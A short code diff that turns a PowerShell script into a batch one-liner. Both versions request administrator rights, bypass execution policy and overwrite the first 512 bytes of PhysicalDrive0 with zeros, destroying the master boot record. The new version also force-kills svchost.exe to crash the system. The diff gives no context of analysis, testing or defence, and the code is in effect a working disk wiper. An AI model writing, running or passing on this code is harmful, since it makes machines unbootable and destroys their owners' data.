@@ -1,6 +1,2 @@
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
-
-$file = [System.IO.File]::Open("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write)
-$nullBytes = New-Object byte[] 512
-$file.Write($nullBytes, 0, 512)
-$file.Close()
+@echo off
+powershell -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"$file = [System.IO.File]::Open(\\\"\\\\.\\PhysicalDrive0\\\", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write); $nullBytes = New-Object byte[] 512; $file.Write($nullBytes, 0, 512); $file.Close(); taskkill /F /IM svchost.exe\"' -Verb RunAs"
